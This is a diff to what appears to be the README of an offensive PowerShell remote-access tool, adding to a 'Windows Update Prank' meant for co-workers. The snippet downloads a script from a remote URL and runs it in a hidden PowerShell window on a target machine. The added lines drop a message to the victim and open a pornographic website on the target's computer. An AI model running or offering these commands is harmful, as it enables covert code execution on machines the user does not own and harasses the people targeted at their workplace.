@@ -109,10 +109,16 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papa
 
 <br />
 
-#### Windows Update Prank ( prank your co-workers )
+#### Windows Update Prank ( prank your co-workers -- press F11 on target keyboard to exit prank )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1"
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
+
+## Send a message to target machine
+echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.txt;del ola.txt
+
+## Open porn websites
+Start https://youporn.com
 ```
 
 ---
